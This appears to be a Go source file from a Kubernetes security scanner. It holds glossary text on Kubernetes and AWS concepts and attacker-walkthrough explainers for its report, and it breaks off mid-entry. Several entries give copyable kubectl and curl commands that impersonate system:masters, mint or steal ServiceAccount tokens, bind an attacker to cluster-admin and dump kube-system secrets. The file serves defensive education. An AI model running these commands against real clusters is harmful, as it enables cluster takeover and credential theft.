// Package report — glossary and explainer copy used by the interactive attack-graph in the HTML
// report. This is presentation-layer content: it deliberately does not live on models.Finding so
// it stays out of JSON/CSV/SARIF outputs, and lets us iterate on copy without re-running scans.
//
// All HTML strings are rendered into a self-contained report — no remote assets, no <script>
// content, only inline markup for typography (<code>, <strong>, <em>, <p>).
package report

import (
	"html/template"
	"strings"

	"github.com/0hardik1/kubesplaining/internal/models"
)

// GlossaryEntry teaches one Kubernetes concept that appears as an entry-point or capability node
// in the attack graph. Short feeds tooltips; Long renders into the side-panel detail view.
type GlossaryEntry struct {
	Title  string        `json:"Title"`
	Short  string        `json:"Short"`
	Long   template.HTML `json:"Long"`
	DocURL string        `json:"DocURL,omitempty"`
}

// AttackerStep is one entry in an attacker walkthrough. Note is plain-language description
// (always shown). Cmd, when set, is the literal shell command — only Cmd lands in the
// copyable code block, so a reader who clicks Copy gets a runnable string, not prose.
type AttackerStep struct {
	Note string `json:"Note,omitempty"`
	Cmd  string `json:"Cmd,omitempty"`
}

// TechniqueExplainer describes one attacker technique in plain language. Plain renders as HTML
// in the side-panel; AttackerSteps is rendered as an ordered list ("here is what an attacker
// would actually run, in order").
type TechniqueExplainer struct {
	Title         string         `json:"Title"`
	Plain         template.HTML  `json:"Plain"`
	Mitre         string         `json:"Mitre,omitempty"`
	AttackerSteps []AttackerStep `json:"AttackerSteps,omitempty"`
}

// CategoryExplainer is the impact-lane copy. Plain explains what the category means in
// concrete terms; Examples lists real-world manifestations a reader can picture.
type CategoryExplainer struct {
	Title    string        `json:"Title"`
	Plain    template.HTML `json:"Plain"`
	Examples []string      `json:"Examples,omitempty"`
}

// Glossary maps a stable key (subject Kind, resource Kind, or k8s concept name) to its
// teaching entry. Keys must match the GlossaryKey set on GraphNodeDetail at build time.
var Glossary = map[string]GlossaryEntry{
	"ServiceAccount": {
		Title:  "ServiceAccount",
		Short:  "An identity used by pods (not humans) to call the Kubernetes API.",
		Long:   template.HTML(`<p>A <strong>ServiceAccount</strong> is an in-cluster identity assigned to pods. Every pod gets a token mounted at <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>, and that token <em>is</em> the credential. If an attacker reads that file from inside a compromised container (or creates a pod that mounts the token), they can call the API <em>as</em> the ServiceAccount, with whatever permissions the SA has been granted.</p><p>This is the most common pivot in real-world Kubernetes attacks: compromise one pod, steal its token, ride the token to wherever its RBAC allows.</p>`),
		DocURL: "https://kubernetes.io/docs/concepts/security/service-accounts/",
	},
	"Group": {
		Title:  "Group",
		Short:  "A label attached to authenticated identities (for example, system:masters acts as cluster-admin).",
		Long:   template.HTML(`<p>A <strong>Group</strong> is a string label associated with users or ServiceAccounts at authentication time. RoleBindings can target groups, so <em>everyone</em> in the group inherits the bound permissions. Two groups deserve special care:</p><ul><li><code>system:masters</code>: hardcoded as cluster-admin. Membership is permanent (you cannot un-grant it via RBAC).</li><li><code>system:authenticated</code>: every authenticated identity. Bind anything sensitive to this and you grant it to the world.</li></ul><p>Groups are assigned by the authenticator (OIDC claims, certificate organization fields, etc.), not stored in the API server, which means they don't appear in <code>kubectl get</code>.</p>`),
		DocURL: "https://kubernetes.io/docs/reference/access-authn-authz/rbac/#default-roles-and-role-bindings",
	},
	"User": {
		Title:  "User",
		Short:  "A human (or external automation) authenticated by certs, OIDC, or static tokens.",
		Long:   template.HTML(`<p>A <strong>User</strong> in Kubernetes is whoever the authenticator says they are. There is no User object in the API. Identity comes from a client certificate's CN, an OIDC <code>sub</code> claim, a webhook, or a static token. RBAC then targets that identity by name. If you see "User foo" in a finding, foo is whatever string the authentication layer produced.</p>`),
		DocURL: "https://kubernetes.io/docs/reference/access-authn-authz/authentication/",
	},
	"Pod": {
		Title:  "Pod",
		Short:  "The smallest schedulable unit: one or more containers sharing a network and storage namespace.",
		Long:   template.HTML(`<p>A <strong>Pod</strong> wraps one or more containers that share an IP, hostname, and volumes. From an attacker's perspective, a pod is a foothold: the API token mounted into it grants the pod's ServiceAccount permissions; if the pod is privileged or mounts the host filesystem, it's also a path to escape onto the node.</p>`),
		DocURL: "https://kubernetes.io/docs/concepts/workloads/pods/",
	},
	"Deployment": {
		Title:  "Deployment",
		Short:  "A controller that keeps N copies of a pod running, with rolling updates.",
		Long:   template.HTML(`<p>A <strong>Deployment</strong> manages a ReplicaSet which manages Pods. The dangerous attribute lives on the pod template: every replica inherits the same ServiceAccount, the same securityContext, and the same volume mounts. A risky pod template multiplies into N risky pods.</p>`),
		DocURL: "https://kubernetes.io/docs/concepts/workloads/controllers/deployment/",
	},
	"DaemonSet": {
		Title: "DaemonSet",
		Short: "Runs a copy of a pod on every node (often privileged: log collectors, CNI agents).",
		Long:  template.HTML(`<p>A <strong>DaemonSet</strong> schedules one pod per node, typically for cluster infrastructure (CNI, log shipping, node monitoring). DaemonSets are frequent targets because they often need <code>hostNetwork</code>, <code>hostPath</code>, or <code>privileged</code> to do their job, which makes them ideal for attackers if compromised.</p>`),
	},
	"StatefulSet": {
		Title: "StatefulSet",
		Short: "Pods with stable identities and persistent storage: databases, queues.",
		Long:  template.HTML(`<p>A <strong>StatefulSet</strong> gives each pod a stable DNS name and dedicated PersistentVolume. Compromise here often means access to durable application data: databases, message queues, caches.</p>`),
	},
	"ReplicaSet": {
		Title: "ReplicaSet",
		Short: "Maintains a stable set of pod replicas. Usually managed by a Deployment.",
		Long:  template.HTML(`<p>A <strong>ReplicaSet</strong> keeps a target number of identical pods running. You normally don't manage these directly; a Deployment owns them.</p>`),
	},
	"Job": {
		Title: "Job",
		Short: "Runs a pod (or pods) to completion: batch tasks, migrations.",
		Long:  template.HTML(`<p>A <strong>Job</strong> executes one or more pods that must complete successfully. Jobs are a common attacker mechanism for one-shot privilege use ("create a Job that mounts the host filesystem, do the thing, exit").</p>`),
	},
	"Secret": {
		Title:  "Secret",
		Short:  "Stores credentials: TLS keys, registry creds, API tokens, ServiceAccount tokens.",
		Long:   template.HTML(`<p>A <strong>Secret</strong> holds sensitive data: registry pull credentials, TLS private keys, ServiceAccount tokens. Secrets are base64-encoded, <em>not</em> encrypted by default. Anyone with <code>get</code> on the Secret resource can read the contents in cleartext. <code>get</code>/<code>list</code>/<code>watch</code> on Secrets in <code>kube-system</code> is effectively cluster-admin: that namespace holds the controller-manager and kube-scheduler tokens.</p>`),
		DocURL: "https://kubernetes.io/docs/concepts/configuration/secret/",
	},
	"ConfigMap": {
		Title: "ConfigMap",
		Short: "Non-sensitive key/value config data injected into pods. Often misused for credentials.",
		Long:  template.HTML(`<p>A <strong>ConfigMap</strong> stores plain-text configuration that pods read at startup. They are <em>not</em> meant to hold secrets, but in practice teams put database URLs (with passwords), API keys, and tokens in ConfigMaps. Kubesplaining flags credential-shaped keys for that reason.</p>`),
	},
	"ClusterRole": {
		Title:  "ClusterRole",
		Short:  "A cluster-wide bag of (verbs × resources) permissions, granted via a binding.",
		Long:   template.HTML(`<p>A <strong>ClusterRole</strong> is a named set of permissions ("can <code>get</code>/<code>list</code> on <code>pods</code> across the cluster"). It does nothing on its own; it must be granted to a subject through a ClusterRoleBinding (cluster-wide) or RoleBinding (one namespace).</p><p>The infamous <code>cluster-admin</code> ClusterRole grants <code>verbs: ["*"]</code> on <code>resources: ["*"]</code> in <code>apiGroups: ["*"]</code>, which is total control.</p>`),
		DocURL: "https://kubernetes.io/docs/reference/access-authn-authz/rbac/",
	},
	"ClusterRoleBinding": {
		Title:  "ClusterRoleBinding",
		Short:  "Grants a ClusterRole's permissions to a subject across the entire cluster.",
		Long:   template.HTML(`<p>A <strong>ClusterRoleBinding</strong> assigns a ClusterRole to subjects (Users, Groups, ServiceAccounts) at cluster scope, not just one namespace. A binding to <code>cluster-admin</code> here means the subject can do anything anywhere. Always look at <em>both</em> what role is bound <em>and</em> who it is bound to.</p>`),
		DocURL: "https://kubernetes.io/docs/reference/access-authn-authz/rbac/",
	},
	"Role": {
		Title: "Role",
		Short: "Like a ClusterRole, but scoped to a single namespace.",
		Long:  template.HTML(`<p>A <strong>Role</strong> is a permission set that only applies inside one namespace. Roles cannot reference cluster-scoped resources (like Nodes or PersistentVolumes).</p>`),
	},
	"RoleBinding": {
		Title: "RoleBinding",
		Short: "Grants a Role (or ClusterRole) to a subject, scoped to one namespace.",
		Long:  template.HTML(`<p>A <strong>RoleBinding</strong> assigns permissions inside a single namespace. It can reference a Role from the same namespace or a ClusterRole. When it references a ClusterRole, the permissions still only apply inside the binding's namespace.</p>`),
	},
	"Namespace": {
		Title: "Namespace",
		Short: "A logical partition for resources: most policies, quotas, and RBAC scope to one.",
		Long:  template.HTML(`<p>A <strong>Namespace</strong> divides cluster resources by team, environment, or application. RoleBindings, NetworkPolicies, ResourceQuotas, and most admission rules apply at namespace scope. Compromising one workload in a namespace often gives lateral access to the rest of that namespace's resources.</p>`),
	},
	"hostPath": {
		Title:  "hostPath volume",
		Short:  "Mounts a directory from the underlying node into the pod (a classic container-escape vector).",
		Long:   template.HTML(`<p>A <strong>hostPath</strong> volume bind-mounts a path from the host node into the container. Sensitive paths like <code>/</code>, <code>/etc</code>, <code>/var/run/docker.sock</code>, or <code>/var/lib/kubelet</code> turn the pod into a node-takeover primitive: an attacker inside the pod can write systemd units, read the kubelet's credentials, or directly invoke the container runtime to start privileged containers on the host.</p>`),
		DocURL: "https://kubernetes.io/docs/concepts/storage/volumes/#hostpath",
	},
	"PersistentVolume": {
		Title:  "PersistentVolume",
		Short:  "A cluster-scoped storage handle. PVs that wrap hostPath bypass Pod Security Admission.",
		Long:   template.HTML(`<p>A <strong>PersistentVolume</strong> is a cluster-scoped storage object that a PersistentVolumeClaim binds to. PVs come from many sources: CSI drivers, NFS, iSCSI, and (dangerously) <code>hostPath</code>. The Pod Security Admission controller inspects the PodSpec only and never follows the PVC -> PV indirection, so a PV that wraps a sensitive hostPath (<code>/</code>, <code>/etc</code>, <code>/var/lib/kubelet</code>, the container runtime sockets) becomes an unobservable node-escape primitive: a Pod in a Baseline- or Restricted-enforced namespace can mount the equivalent of a sensitive hostPath simply by claiming the PV.</p><p>PVs are non-namespaced. Whoever can create or modify PVs can therefore expose sensitive node directories to any tenant in the cluster, regardless of namespace boundaries.</p>`),
		DocURL: "https://kubernetes.io/docs/concepts/storage/persistent-volumes/",
	},
	"PrivilegedContainer": {
		Title:  "Privileged container",
		Short:  "Runs with kernel-level access to the host (equivalent to root on the node).",
		Long:   template.HTML(`<p>Setting <code>securityContext.privileged: true</code> disables most container isolation: the container gets every Linux capability, can access all host devices, and can mount host filesystems. From a privileged container an attacker can escape to the node trivially (<code>nsenter</code>, mount the host's <code>/</code>, write a SUID binary, etc.).</p>`),
		DocURL: "https://kubernetes.io/docs/concepts/security/pod-security-standards/",
	},
	"hostNetwork": {
		Title: "hostNetwork",
		Short: "Pod shares the node's network namespace, so it sees and binds host ports.",
		Long:  template.HTML(`<p>With <code>hostNetwork: true</code>, the pod sees the host's network interfaces directly. It can reach the kubelet on <code>localhost:10250</code>, sniff or spoof traffic between other workloads on that node, and bind privileged ports without going through the CNI.</p>`),
	},
	"hostPID": {
		Title: "hostPID",
		Short: "Pod sees and can signal every process on the node, including the kubelet.",
		Long:  template.HTML(`<p>With <code>hostPID: true</code>, the pod's PID namespace is the host's. It can <code>ps</code> all processes (including the kubelet), read <code>/proc/&lt;pid&gt;/environ</code> for credentials, and join other processes' namespaces with <code>nsenter</code>.</p>`),
	},
	"RunAsRoot": {
		Title: "Container runs as root (UID 0)",
		Short: "No runAsNonRoot constraint, so kernel exploits and breakout primitives apply.",
		Long:  template.HTML(`<p>Containers that run as UID 0 are not automatically dangerous, but they remove a layer of defence. Combined with capabilities or hostPath, root-in-container becomes root-on-node much more easily.</p>`),
	},
	"Capabilities": {
		Title: "Linux capabilities",
		Short: "Fine-grained kernel privileges: SYS_ADMIN, NET_ADMIN, and similar are container-escape primitives.",
		Long:  template.HTML(`<p>Linux <strong>capabilities</strong> split root's powers into ~40 buckets. <code>SYS_ADMIN</code> alone is enough to mount filesystems and break out of most container runtimes. <code>NET_ADMIN</code> allows traffic redirection. <code>SYS_PTRACE</code> lets a container read other processes' memory. The principle is: drop everything, add only what is needed.</p>`),
	},
	"NetworkPolicy": {
		Title: "NetworkPolicy",
		Short: "Cluster-internal firewall. Without one, every pod can talk to every other pod.",
		Long:  template.HTML(`<p>A <strong>NetworkPolicy</strong> restricts which pods can talk to which. The default in Kubernetes is <em>allow-all</em>: a pod with no NetworkPolicies covering it can reach every pod in the cluster, including the API server, etcd via metrics endpoints, and internal services. Lateral movement after pod compromise depends on whether NetworkPolicies are enforced.</p>`),
	},
	"AdmissionWebhook": {
		Title: "Admission webhook",
		Short: "A pluggable validator/mutator for API requests; failurePolicy: Ignore is a security gap.",
		Long:  template.HTML(`<p>An <strong>admission webhook</strong> intercepts API requests before they are persisted, allowing custom policy. If a security-critical webhook has <code>failurePolicy: Ignore</code>, an outage of the webhook backend silently disables enforcement, and attackers can race a webhook restart and slip through.</p>`),
	},
	"kube-system": {
		Title: "kube-system namespace",
		Short: "Holds the control plane's ServiceAccounts and tokens. Read-access here is cluster-admin.",
		Long:  template.HTML(`<p>The <strong>kube-system</strong> namespace contains tokens for the controller-manager, kube-scheduler, and other privileged controllers. Anyone who can <code>get</code>/<code>list</code>/<code>watch</code> Secrets in kube-system can read those tokens and act as those controllers, which is effectively cluster-admin.</p>`),
	},
	"system:masters": {
		Title: "system:masters group",
		Short: "Hardcoded as cluster-admin. Membership cannot be revoked through RBAC.",
		Long:  template.HTML(`<p>The <strong>system:masters</strong> group is special-cased in the API server: members bypass RBAC and act as cluster-admin. The membership comes from the authenticator (typically certificate <code>O=system:masters</code>) and <em>cannot</em> be removed by deleting bindings; it is wired in below the RBAC layer.</p>`),
	},
	"ResourceQuota": {
		Title: "ResourceQuota",
		Short: "Namespace-scoped cap on CPU, memory, and object counts (prevents noisy-neighbor and DoS).",
		Long:  template.HTML(`<p>A <strong>ResourceQuota</strong> caps total compute and object counts inside a namespace: aggregate CPU / memory requests and limits across all pods, plus per-kind object counts (Pods, Services, Secrets, PVCs). Once a quota exists, the kube-apiserver rejects any pod whose containers do not declare matching <code>resources.requests</code> and <code>resources.limits</code> for the quota's tracked resources. ResourceQuota is the namespace-level multi-tenancy backstop: without it, a single workload can starve every co-tenant on the same node, or an attacker who lands code execution can spawn unlimited replicas / Secrets / Pods until something breaks.</p>`),
	},
	"LivenessProbe": {
		Title: "Liveness probe",
		Short: "Periodic kubelet check that restarts a container when it stops responding.",
		Long:  template.HTML(`<p>A <strong>livenessProbe</strong> is a periodic HTTP / TCP / exec / gRPC check the kubelet runs against the container. When it fails for <code>failureThreshold</code> consecutive intervals, the kubelet kills and restarts the container. Liveness solves the "PID 1 is alive but wedged" case: a deadlocked thread, an infinite GC loop, or a stuck-on-startup dependency. It is intentionally <em>different</em> from the <code>readinessProbe</code> (which gates Service endpoint membership, not restart). The correct shape is a tiny <code>/livez</code> handler with no downstream dependencies; a liveness probe that touches the database will restart the pod every time the database hiccups, amplifying outages.</p>`),
	},
	"LimitRange": {
		Title: "LimitRange",
		Short: "Namespace-scoped default + min/max for pod / container resource requests and limits.",
		Long:  template.HTML(`<p>A <strong>LimitRange</strong> declares per-namespace default <code>requests</code> / <code>limits</code> for pod and container resources, plus optional <code>min</code> / <code>max</code> bounds the kube-apiserver enforces at admission. When a pod is created without explicit resources, the LimitRange default is injected, so authors who forget the limits no longer ship <code>BestEffort</code> workloads by accident. Combined with a namespace <code>ResourceQuota</code> the pair gives operators a default-on baseline (LimitRange) plus a hard cap (ResourceQuota), which together prevent both noisy-neighbor failures and unbounded resource consumption from a single misconfiguration.</p>`),
	},
	"CertificateSigningRequest": {
		Title:  "CertificateSigningRequest",
		Short:  "API resource for requesting a signed client / serving certificate from the cluster CA.",
		Long:   template.HTML(`<p>A <strong>CertificateSigningRequest</strong> (CSR) carries an x509 signing request that asks the cluster's CA to issue a certificate. The signer is named via <code>spec.signerName</code> (e.g. <code>kubernetes.io/kube-apiserver-client</code> for API authentication, <code>kubernetes.io/kubelet-serving</code> for node serving certs). The CSR's Subject DN is attacker-controlled: the <code>CN</code> becomes the authenticated User and each <code>O</code> (Organization) becomes a Group.</p><p>Two RBAC verbs control the lifecycle: <code>create</code> on <code>certificatesigningrequests</code> lets you submit a CSR, and <code>update</code>/<code>patch</code> on the <code>certificatesigningrequests/approval</code> subresource lets you mark it Approved. The kube-controller-manager then signs whatever was approved. Holding both verbs is equivalent to cluster-admin: submit a CSR with <code>O=system:masters</code>, self-approve, retrieve the signed cert, and authenticate as <code>system:masters</code> (which the apiserver hard-codes as cluster-admin). Cert lifetime is whatever the signer applies (often a year), and revoking the original RBAC grant does not invalidate already-issued certs.</p>`),
		DocURL: "https://kubernetes.io/docs/reference/access-authn-authz/certificate-signing-requests/",
	},
	// Cloud-provider entries (EKS / AWS). Surface IAM concepts that show up as
	// external Subjects on KUBE-CLOUD-* findings and as external nodes in the
	// privesc graph, so a reader following an IRSA or aws-auth chain has the
	// background to read the side panel without context-switching to AWS docs.
	"AWSAccount": {
		Title:  "AWS Account",
		Short:  "Top-level container for AWS resources and IAM identities.",
		Long:   template.HTML(`<p>An <strong>AWS account</strong> is the billing and isolation boundary that owns every IAM role, IAM user, and AWS resource an EKS cluster touches. Cross-account access requires explicit trust-policy statements, so the account number in an ARN is the first thing to check when an IAM principal shows up in an aws-auth mapping or IRSA annotation.</p>`),
		DocURL: "https://docs.aws.amazon.com/general/latest/gr/accts.html",
	},
	"IAMRole": {
		Title:  "AWS IAM Role",
		Short:  "AWS identity that pods can assume via IRSA.",
		Long:   template.HTML(`<p>An <strong>AWS IAM role</strong> is an assumable identity in an AWS account: it carries a permissions policy plus a trust policy that names who may assume it. On EKS, the trust policy can name the cluster's OIDC issuer, so a Kubernetes ServiceAccount with the matching <code>eks.amazonaws.com/role-arn</code> annotation can call <code>sts:AssumeRoleWithWebIdentity</code> and receive short-lived AWS credentials.</p><p>Because the role's permissions apply to whatever workload mounts the SA, an over-broad IAM role (e.g. one with <code>AdministratorAccess</code>) becomes an AWS-side privilege escalation primitive routed through Kubernetes.</p>`),
		DocURL: "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles.html",
	},
	"IAMUser": {
		Title:  "AWS IAM User",
		Short:  "AWS human / programmatic identity, often mapped via aws-auth.",
		Long:   template.HTML(`<p>An <strong>AWS IAM user</strong> is a long-lived identity, typically representing a human or a CI system, that authenticates with an access-key pair. On EKS, the <code>aws-auth</code> ConfigMap can map an IAM user ARN to one or more Kubernetes groups: if those groups include <code>system:masters</code>, or if any of them is bound to <code>cluster-admin</code>, that AWS user is effectively cluster-admin without ever appearing in <code>kubectl get clusterrolebindings</code>.</p>`),
		DocURL: "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_users.html",
	},
	"IMDSEndpoint": {
		Title:  "EC2 Instance Metadata Service",
		Short:  "Link-local credential endpoint (169.254.169.254); reachable by default from EC2-backed pods.",
		Long:   template.HTML(`<p>The <strong>EC2 Instance Metadata Service</strong> (IMDS) is a link-local HTTP service at <code>169.254.169.254</code> that returns the EC2 instance's attached IAM role credentials, among other metadata. On an EKS worker node, that role is typically the node IAM role with permissions like <code>ec2:DescribeInstances</code> and <code>ecr:GetAuthorizationToken</code>, plus whatever the operator added.</p><p>Pods inherit the host's network unless a NetworkPolicy blocks egress to <code>169.254.169.254/32</code>: a compromised pod can curl IMDS, steal node-role credentials, and pivot into AWS. IMDSv2 (token-based) mitigates SSRF but does not block in-cluster pod access.</p>`),
		DocURL: "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html",
	},
	"IRSA": {
		Title:  "IAM Roles for Service Accounts",
		Short:  "EKS mechanism that lets a Kubernetes SA assume an AWS IAM role via STS.",
		Long:   template.HTML(`<p><strong>IAM Roles for Service Accounts</strong> (IRSA) is the EKS-native way to give a Kubernetes ServiceAccount AWS permissions without putting long-lived credentials into a Secret. The SA is annotated with <code>eks.amazonaws.com/role-arn=arn:aws:iam::&lt;acct&gt;:role/&lt;role&gt;</code>, the cluster's OIDC provider signs the projected SA token, and the AWS SDK calls <code>sts:AssumeRoleWithWebIdentity</code> to exchange the token for time-bounded AWS credentials.</p><p>IRSA is the preferred alternative to mounting node-role credentials via IMDS, because it scopes AWS access per-workload. The risk is the same as any RBAC grant: an over-broad IAM role attached to a low-trust SA is an AWS privilege-escalation primitive.</p>`),
		DocURL: "https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html",
	},
}

// Techniques maps a privesc-action key (matching the Action strings in
// internal/analyzer/privesc/graph.go) to its educational content.
var Techniques = map[string]TechniqueExplainer{
	"impersonate_system_masters": {
		Title: "Impersonation of system:masters",
		Plain: template.HTML(`<p>The <code>impersonate</code> verb on <code>groups: ["*"]</code> (or explicitly on <code>system:masters</code>) lets the holder send requests as the hard-coded <code>system:masters</code> group. The kube-apiserver short-circuits authorization for that group, so every API call succeeds regardless of RBAC.</p><p>This is the worst-case impersonation grant: it bypasses the cluster's entire RBAC layer rather than borrowing another principal's permissions.</p>`),
		Mitre: "T1078.004 — Cloud Accounts",
		AttackerSteps: []AttackerStep{
			{Note: "Confirm the bypass works by querying as system:masters", Cmd: "kubectl auth can-i --list --as=system:masters --as-group=system:masters"},
			{Note: "Read every Secret cluster-wide", Cmd: "kubectl --as=system:masters --as-group=system:masters get secrets -A"},
		},
	},
	"mint_arbitrary_token": {
		Title: "Mint a token for any ServiceAccount",
		Plain: template.HTML(`<p>The <code>create</code> verb on <code>serviceaccounts/token</code> at cluster scope (without <code>resourceNames</code>) lets the holder mint a fresh, valid token for <em>any</em> ServiceAccount in any namespace. No pod creation or exec needed, and it leaves a thinner audit trail than the pod-mount route.</p>`),
		Mitre: "T1528 — Steal Application Access Token",
		AttackerSteps: []AttackerStep{
			{Note: "Mint a 24h token for a privileged ServiceAccount", Cmd: "kubectl create token <sa> -n <ns> --duration=24h"},
			{Note: "Call the API as the ServiceAccount using the minted token", Cmd: "curl --header 'Authorization: Bearer <token>' https://kubernetes.default.svc/api/..."},
		},
	},
	"impersonate": {
		Title: "RBAC impersonation",
		Plain: template.HTML(`<p>Kubernetes has a built-in "act as another user" feature: the <code>impersonate</code> verb on <code>users</code>, <code>groups</code>, or <code>serviceaccounts</code>. Anyone with that verb can submit requests as <em>any</em> identity, bypassing whatever permissions they don't have themselves.</p><p>Granting <code>impersonate</code> on <code>groups</code> = <code>["*"]</code> is equivalent to cluster-admin: the holder can impersonate <code>system:masters</code>.</p>`),
		Mitre: "T1078.004 — Cloud Accounts",
		AttackerSteps: []AttackerStep{
			{Note: "Confirm impersonation works", Cmd: "kubectl auth can-i --list --as=system:masters"},
			{Note: "Exfiltrate every secret", Cmd: "kubectl --as=system:masters get secrets -A"},
			{Note: "Pin permanent cluster-admin for an attacker-controlled user", Cmd: "kubectl --as=system:masters create clusterrolebinding pwn --clusterrole=cluster-admin --user=attacker"},
		},
	},
	"impersonate_serviceaccount": {
		Title: "Namespace-scoped ServiceAccount impersonation",
		Plain: template.HTML(`<p>The <code>impersonate</code> verb on <code>serviceaccounts</code>, granted by a namespace-scoped <strong>RoleBinding</strong>, lets the holder act as any ServiceAccount that lives <em>in the binding's namespace</em>. The reach is bounded — they can't impersonate SAs in other namespaces, and they can't impersonate users or groups — but it's still a token-free credential-borrow that inherits whatever cluster-wide permissions the impersonated SA happens to have.</p><p>Real exposure depends on what the SAs in the namespace can do: an in-namespace controller SA bound to a powerful ClusterRole becomes a stepping stone out of the namespace.</p>`),
		Mitre: "T1078.004 — Cloud Accounts",
		AttackerSteps: []AttackerStep{
			{Note: "List the SAs you can impersonate (every SA in the binding's namespace)", Cmd: "kubectl get sa -n <ns>"},
			{Note: "Borrow a target SA's identity and probe its reach", Cmd: "kubectl auth can-i --list --as=system:serviceaccount:<ns>:<target-sa>"},
			{Note: "Read whatever the impersonated SA can read (Secrets, ConfigMaps, etc.)", Cmd: "kubectl --as=system:serviceaccount:<ns>:<target-sa> get secrets -A"},
		},
	},
	"bind_or_escalate": {
		Title: "RBAC bind/escalate bypass",
		Plain: template.HTML(`<p>RBAC has a guardrail: you can only grant permissions you yourself hold. Two verbs override that guardrail: <code>bind</code> (on a Role/ClusterRole) and <code>escalate</code> (also on Roles). Holding either lets the attacker create a binding to a Role they don't have themselves, including <code>cluster-admin</code>.</p><p>Scope matters. Granted by a ClusterRoleBinding the reach is cluster-wide; granted by a RoleBinding it bounds the bypass to the binding's namespace — namespace-admin instead of cluster-admin, but still a complete takeover of every workload, Secret, and ConfigMap in that namespace.</p>`),
		Mitre: "T1098.003 — Account Manipulation: Additional Cloud Roles",
		AttackerSteps: []AttackerStep{
			{Note: "Bind a chosen ServiceAccount to cluster-admin", Cmd: "kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=ns:me"},
			{Note: "Verify cluster-admin reach", Cmd: "kubectl get secrets -A"},
		},
	},
	"pod_create_token_theft": {
		Title: "Pod creation → ServiceAccount token theft",
		Plain: template.HTML(`<p>Anyone who can create pods in a namespace can mount any ServiceAccount in that namespace into the pod. Cluster-scoped pod-create lets you mount any ServiceAccount in <em>any</em> namespace. Once the pod is running, the attacker reads <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code> from inside it, and now holds a token for that SA.</p><p>This is the single most common privilege-escalation pattern in production Kubernetes.</p>`),
		Mitre: "T1528 — Steal Application Access Token",
		AttackerSteps: []AttackerStep{
			{Note: "Spin up a pod that mounts the privileged ServiceAccount's token", Cmd: "kubectl run thief --image=alpine --serviceaccount=privileged-sa --command -- sleep infinity"},
			{Note: "Read the mounted token from inside the pod", Cmd: "kubectl exec thief -- cat /var/run/secrets/kubernetes.io/serviceaccount/token"},
			{Note: "Call the API as the stolen ServiceAccount", Cmd: "curl --header 'Authorization: Bearer <token>' https://kubernetes.default.svc/api/..."},
		},
	},
	"pod_exec": {
		Title: "Pod exec → container takeover",
		Plain: template.HTML(`<p>The <code>pods/exec</code> subresource opens a shell inside a running container. If the container's pod uses a privileged ServiceAccount, the attacker inherits that SA's reach. If the container is itself privileged or mounts the host, this is also a node-escape primitive.</p>`),
		Mitre: "T1611 — Escape to Host",
		AttackerSteps: []AttackerStep{
			{Note: "Open a shell inside a pod whose ServiceAccount is privileged", Cmd: "kubectl exec -it <pod-with-privileged-sa> -- /bin/sh"},
			{Note: "Read the mounted ServiceAccount token", Cmd: "cat /var/run/secrets/kubernetes.io/serviceaccount/token"},
		},
	},
	"token_request": {
		Title: "TokenRequest minting",
		Plain: template.HTML(`<p>The <code>create</code> verb on <code>serviceaccounts/token</code> mints a fresh, valid token for any ServiceAccount in scope, with no pod required. Cleaner than the pod-creation route and harder to spot in audit logs.</p>`),
		Mitre: "T1528 — Steal Application Access Token",
		AttackerSteps: []AttackerStep{
			{Note: "Mint a fresh 24h token for any ServiceAccount in scope", Cmd: "kubectl create token <sa> --duration=24h --bound-object-kind=Pod --bound-object-name=irrelevant"},
			{Note: "Call the API as the ServiceAccount using the minted token", Cmd: "curl --header 'Authorization: Bearer <token>' https://kubernetes.default.svc/api/..."},
		},
	},
	"bound_to_cluster_admin": {
		Title: "Direct cluster-admin binding",
		Plain: template.HTML(`<p>The subject is bound directly to the <code>cluster-admin</code> ClusterRole through a ClusterRoleBinding. No chain is needed; they are already cluster-admin. The only question is whether the subject itself can be compromised.</p>`),
		Mitre: "T1078 — Valid Accounts",
		AttackerSteps: []AttackerStep{
			{Note: "Enumerate every subject already bound to cluster-admin", Cmd: "kubectl get clusterrolebinding -o json | jq '.items[] | select(.roleRef.name==\"cluster-admin\") | .subjects'"},
			{Note: "Compromise any subject in that list. Done."},
		},
	},
	"wildcard_permission": {
		Title: "Wildcard verbs × wildcard resources",
		Plain: template.HTML(`<p>An RBAC rule with <code>verbs: ["*"]</code>, <code>resources: ["*"]</code>, and <code>apiGroups: ["*"]</code> is functionally identical to cluster-admin, even if it isn't called that. Often introduced by careless Helm charts or "give it permission to everything until it works" debugging.</p>`),
		Mitre: "T1078 — Valid Accounts",
	},
	"modify_role_binding": {
		Title: "RoleBinding write access",
		Plain: template.HTML(`<p><code>create</code>/<code>update</code>/<code>patch</code> on <code>rolebindings</code> or <code>clusterrolebindings</code> lets the attacker bind themselves to any role, typically cluster-admin. They don't need the role's permissions today, only the ability to change bindings.</p><p>Scope matters. Granted at cluster scope (via a ClusterRoleBinding, or with cluster-wide reach on <code>rolebindings</code>) the reach is cluster-admin equivalent. Granted by a RoleBinding the reach is bounded to that one namespace — full namespace-admin, but the bound ClusterRole's verbs apply only inside the binding's namespace.</p>`),
		Mitre: "T1098 — Account Manipulation",
		AttackerSteps: []AttackerStep{
			{Note: "Append yourself as a subject on an existing high-privilege binding", Cmd: "kubectl patch clusterrolebinding existing-binding --type=json -p='[{\"op\":\"add\",\"path\":\"/subjects/-\",\"value\":{\"kind\":\"ServiceAccount\",\"name\":\"me\",\"namespace\":\"ns\"}}]'"},
			{Note: "Or, when only namespace-scoped, RoleBind yourself to cluster-admin within the namespace", Cmd: "kubectl create rolebinding pwn -n <ns> --clusterrole=cluster-admin --serviceaccount=<ns>:me"},
		},
	},
	"read_secrets": {
		Title: "Secrets read access",
		Plain: template.HTML(`<p><code>get</code>/<code>list</code>/<code>watch</code> on Secrets in kube-system or cluster-wide reads the controller-manager, scheduler, and node-bootstrap tokens: every credential needed to act as the control plane.</p>`),
		Mitre: "T1552 — Unsecured Credentials",
		AttackerSteps: []AttackerStep{
			{Note: "Dump every ServiceAccount token stored in kube-system", Cmd: "kubectl get secret -n kube-system -o json | jq -r '.items[] | select(.type==\"kubernetes.io/service-account-token\") | .data.token' | base64 -d"},
		},
	},
	"nodes_proxy": {
		Title: "nodes/proxy → kubelet API",
